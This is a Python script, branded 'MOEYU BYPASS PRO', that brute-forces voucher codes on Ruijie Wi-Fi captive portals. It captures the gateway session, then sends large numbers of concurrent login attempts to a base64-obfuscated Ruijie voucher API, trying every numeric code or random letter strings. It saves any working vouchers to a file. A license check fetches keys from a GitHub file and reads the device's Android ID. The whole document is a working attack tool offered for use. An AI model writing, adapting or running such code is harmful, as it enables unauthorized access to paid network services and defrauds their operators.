#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import requests
import aiohttp
import asyncio
import argparse
from datetime import datetime, date
from urllib.parse import quote, urlparse, parse_qs, urljoin

# ==========================================
# 0. GITHUB LICENSE SYSTEM
# ==========================================

GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

LICENSE_STORAGE = os.path.expanduser("~/.ruijie_license.json")
KEY_STORAGE_FILE = os.path.expanduser("~/.ruijie_device_key.txt")

def get_stable_device_id():
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key: return saved_key
        except: pass
    
    try:
        import subprocess
        android_id = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if android_id and len(android_id) > 5:
            stable_key = hashlib.md5(f"STABLE_{android_id}".encode()).hexdigest()[:16].lower()
        else:
            import uuid
            install_path = os.path.dirname(os.path.abspath(__file__))
            stable_key = hashlib.md5(f"{install_path}{uuid.getnode()}".encode()).hexdigest()[:16].lower()
    except:
        stable_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f: f.write(stable_key)
    except: pass
    return stable_key

def verify_license_online():
    sys_key = get_stable_device_id()
    try:
        response = requests.get(GITHUB_KEY_URL, timeout=10)
        if response.status_code != 200: return None, None, "SERVER_ERROR"
        lines = response.text.strip().split('\n')
    except: return None, None, "NETWORK_ERROR"
    
    for line in lines:
        line = line.strip()
        if not line or line.lower().startswith('key'): continue
        data = [d.strip() for d in line.split(',')]
        if data and data[0].lower() == sys_key.lower():
            expiry_str = data[2] if len(data) >= 3 else "UNLIMITED"
            if expiry_str != "UNLIMITED":
                try:
                    expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d").date()
                    if date.today() > expiry_date: return False, expiry_str, "EXPIRED"
                except: pass
            return True, expiry_str, "ACTIVE"
    return False, "N/A", "NOT_FOUND"

def check_license():
    sys_key = get_stable_device_id()
    online_result, expiry_str, msg = verify_license_online()
    if online_result is True:
        print(f"{g}[✓] License ACTIVE (Expires: {expiry_str}){w}")
        return True
    print(f"{r}[✗] License INVALID: {msg}{w}")
    return False

# ==========================================
# COLORS & UI
# ==========================================

w = "\033[1;00m"; g = "\033[1;32m"; y = "\033[1;33m"
r = "\033[1;31m"; b = "\033[1;34m"

def clear(): os.system("clear")
def Line(): print(f"{y}-" * os.get_terminal_size()[0] + f"{w}")

def Logo():
    clear()
    logo = f"""{r}
  __  __  U  ___ u  U _____ u __   __ U  _   u 
 |  \/  |  \/"   "| \| ___"|/ \ \ / /  \| |" | 
 | \  / |  | |"| |  |  _|"    \ V /    | |_| | 
 | |\/| |  | |_| |  | |___    _| |_   <|  _  |>
 |_|  |_|   \___/   |_____|  |_| |_|   |_| |_| 
{w}           >> MOEYU BYPASS PRO v5.2 <<{g}
       「 GitHub License Managed System 」{w}"""
    print(logo)
    Line()
    print(f"{w}[*] Developer: Moe Yu")
    Line()

# ==========================================
# VOUCHER BRUTE FORCE FUNCTIONS
# ==========================================

SUCCESS = 0
IN_RUNNING_ASCII_BIN = []

# ASCII Binary Table Loading
try:
    ascii_lower_bin6 = open("ascii_lower_bin6.txt", "r").read().splitlines()
    ascii_lower_bin7 = open("ascii_lower_bin7.txt", "r").read().splitlines()
    ascii_upper_bin6 = open("ascii_upper_bin6.txt", "r").read().splitlines()
    ascii_upper_bin7 = open("ascii_upper_bin7.txt", "r").read().splitlines()
    ascii_bin_mix6 = open("ascii_bin_mix6.txt", "r").read().splitlines()
    ascii_bin_mix7 = open("ascii_bin_mix7.txt", "r").read().splitlines()
except:
    ascii_lower_bin6 = ascii_lower_bin7 = ascii_upper_bin6 = ascii_upper_bin7 = ascii_bin_mix6 = ascii_bin_mix7 = []

async def get_session_id(session, session_url, previous_session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    }
    try:
        async with session.get(session_url, headers=headers) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
            return sid
    except: return previous_session_id

async def login_voucher(session, session_id, voucher, file=None, check=False, debug=False):
    global SUCCESS
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
    }
    try:
        async with session.post(post_url, json=data, headers=headers) as req:
            response = await req.text()
            if 'logonUrl' in response:
                SUCCESS += 1
                print(f'{g}Success: {voucher}{w}')
                with open("success.txt", "a") as f: f.write(voucher+"\n")
            elif 'expired' in response:
                if not check: print(f'{y}Expired: {voucher}{w}')
                if file: open(file, "a").write(voucher+"\n")
            elif 'failed' in response:
                if debug: print(f'{r}Failed: {voucher}{w}', end="\r")
                if file: open(file, "a").write(voucher+"\n")
            elif 'STA' in response:
                if not check: print(f'{b}Limited: {voucher}{w}')
                if file: open(file, "a").write(voucher+"\n")
    except: pass

def ascii_generator(mode, length):
    chars = ""
    if mode == "ascii-lower": chars = string.ascii_lowercase
    elif mode == "ascii-upper": chars = string.ascii_uppercase
    elif mode == "ascii-mix": chars = string.ascii_letters
    
    voucher = "".join(random.choice(chars) for _ in range(length))
    if voucher in IN_RUNNING_ASCII_BIN:
        return ascii_generator(mode, length)
    return voucher

def digit_generator(length):
    limit = 10**length
    return [str(i).zfill(length) for i in range(limit)]

class VoucherCode:
    def __init__(self, mode, length, speed, tasks, debug):
        self.mode, self.length, self.speed, self.tasks, self.debug = mode, length, speed, tasks, debug
        self.file = f"failed_{mode}_{length}.txt"
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except: sys.exit(f"{r}[!] Run --setup first{w}")

    async def execute_ascii(self):
        global IN_RUNNING_ASCII_BIN
        Logo()
        print(f"[*] Bruteforce Mode: {self.mode} | Length: {self.length}")
        print(f"[*] Tasks: {self.tasks} | Speed: {self.speed}")
        Line()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
            tasks_list = []
            loop = 0
            while True:
                voucher = ascii_generator(self.mode, self.length)
                if loop % 90 == 0: sid = await get_session_id(session, self.session_url, None)
                tasks_list.append(login_voucher(session, sid, voucher, self.file, debug=self.debug))
                if len(tasks_list) >= self.tasks:
                    await asyncio.gather(*tasks_list)
                    tasks_list = []
                loop += 1
                IN_RUNNING_ASCII_BIN.append(voucher)

    async def execute_digit(self):
        generated = digit_generator(self.length)
        try:
            old_fails = set(open(self.file, "r").read().splitlines())
            vouchers = [v for v in generated if v not in old_fails]
        except: vouchers = generated
        
        Logo()
        print(f"[*] Bruteforce Mode: {self.mode} | Total: {len(vouchers)}")
        Line()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
            tasks_list = []
            sid = await get_session_id(session, self.session_url, None)
            for i, v in enumerate(vouchers):
                if i % 90 == 0: sid = await get_session_id(session, self.session_url, sid)
                tasks_list.append(login_voucher(session, sid, v, self.file, debug=self.debug))
                if len(tasks_list) >= self.tasks:
                    await asyncio.gather(*tasks_list)
                    tasks_list = []
            if tasks_list: await asyncio.gather(*tasks_list)

def setup():
    Logo()
    print(f"{y}[*] Capturing Wi-Fi Session...{w}")
    try:
        res = requests.get("http://192.168.0.1", timeout=10).url
        gw = re.search(r'gw_address=(.*?)&', res).group(1)
        with open(".ip", "w") as f: f.write(gw)
        with open(".session_url", "w") as f: f.write(res)
        print(f"{g}[✓] Setup Complete! Gateway: {gw}{w}")
    except: print(f"{r}[✗] Setup Failed! Check Wi-Fi connection.{w}")

def feature():
    Logo()
    if not check_license(): sys.exit()
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-o", "--option", choices=["code", "setup", "check"], required=True)
    parser.add_argument("-m", "--mode", choices=["digit", "ascii-lower", "ascii-upper", "ascii-mix"], default="digit")
    parser.add_argument("-l", "--length", choices=[6, 7], type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    parser.add_argument("-t", "--tasks", type=int, default=100)
    parser.add_argument("-d", "--debug", action="store_true")
    args = parser.parse_args()
    
    if args.option == "code":
        vobj = VoucherCode(args.mode, args.length, args.speed, args.tasks, args.debug)
        if args.mode == "digit": asyncio.run(vobj.execute_digit())
        else: asyncio.run(vobj.execute_ascii())
    elif args.option == "setup": setup()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--key":
            print(f"\n{g}Device ID: {get_stable_device_id()}{w}"); sys.exit()
        elif sys.argv[1] == "--reset":
            for f in [LICENSE_STORAGE, KEY_STORAGE_FILE, ".ip", ".session_url"]:
                if os.path.exists(f): os.remove(f)
            print(f"{g}[✓] All cache cleared.{w}"); sys.exit()
    feature()
